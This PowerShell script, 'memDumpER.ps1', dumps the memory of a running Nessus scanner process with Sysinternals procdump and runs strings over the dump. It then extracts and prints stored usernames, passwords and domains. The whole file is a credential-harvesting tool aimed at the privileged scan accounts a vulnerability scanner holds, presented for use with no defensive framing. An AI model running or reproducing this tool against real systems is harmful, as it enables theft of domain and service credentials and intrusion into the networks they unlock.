﻿####################################################################################
# 
# memDumpER.ps1 
# Find process, Dump memory, search and Display passwords 
#
# Description 
#
# Example 
#	 .\memDumpER.ps1
#
# Author: CBHue
#
# Updated: 01.10.16
# Supported Binaries: Nessus
#
####################################################################################

$DebugPreference = "Continue"
$global:sw = [Diagnostics.Stopwatch]::StartNew()

# Woriking Directory
$scriptpath = $MyInvocation.MyCommand.Path
$dir = Split-Path $scriptpath
pushd $dir
Write-host "My directory is $dir"

$dest = $dir + "\Dump\"
if (!(Test-Path $dest)) { mkdir $dest -Force }

# We are using sysinternals to dump so we have to check for some tools
$pDump = $dir + "\procdump.exe"
if (!(Test-Path $pDump)) {
    Write-Host "$pDump not found ... loking in other places ..."
    $Dump = Get-Childitem –Path C:\ -filter procdump.exe -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1 { $place_path = $_.directory; echo "${place_path}\${_}"}
    if ($Dump.count -eq 0) {
        Write-Host "$pDump not found!!! Exiting ..." -foregroundcolor red -backgroundcolor black
        popd
        Exit
    }
    else { $pDump = $Dump.directory.ToString() + "\procdump.exe"}
}

$sOut = $dir + "\strings.exe"
if (!(Test-Path $sOut)) {
    Write-Host "$sOut not found ... loking in other places ..."
    $Out = Get-Childitem –Path C:\ -filter strings.exe -Recurse -ErrorAction SilentlyContinue | Select-Object Directory -First 1
    if ($Out.count -eq 0) {
        Write-Host "$sOut not found!!! Exiting ..." -foregroundcolor red -backgroundcolor black
        popd
        Exit
    }
    else { $sOut = $Out.directory.ToString() + "\strings.exe"}
}

Write-Debug  "$($sw.Elapsed) Trying to Dump process"
$nessusID = (Get-Process nessusd | select -expand id)
if ($nessusID.count -eq 0) {Write-Host "Nessus proc is not found!!! Exiting ..." -foregroundcolor red -backgroundcolor black; Exit }
$a1 = '-ma'
$a2 = '-accepteula'
$a3 = '-o'
$dFile = 'memDump_Nessus.dmp'
$dumpDest = $dest + $dFile 
#cmd /c $pDump $a1 $a2 $a3 $nessusID $dumpDest

# Now we need to get the strings of the file
Write-Debug  "$($sw.Elapsed) Stringing using $sOut"
$a1 = '-accepteula'
$sFile = 'memDump_Nessus.txt'
$stringDest = $dest + $sFile
cmd /c $sOut $a1 $dumpDest 1> $stringDest

# Search for usernames
Write-Debug  "$($sw.Elapsed) Searching for usernames in $stringDest"
$UnP = Select-String -Path $stringDest -Pattern '{"uuid":"'| Out-String
Write-Output $UnP
($unP.Split(",")) | foreach {
    if ($_ -match '^"username"') {
        Write-Output "++++++++++++++++++++++++++++++++++++++++++++++"
        Write-Host "$_" -foregroundcolor green -backgroundcolor black
    }
    if ($_ -match '^"password"') {
        Write-Host "$_" -foregroundcolor red -backgroundcolor black
    }
    if ($_ -match '^"domain"') {
        Write-Host  $_.Trim("}","]") -foregroundcolor green -backgroundcolor black
    }
}
Write-Output "++++++++++++++++++++++++++++++++++++++++++++++"
popd
$sw.Stop()

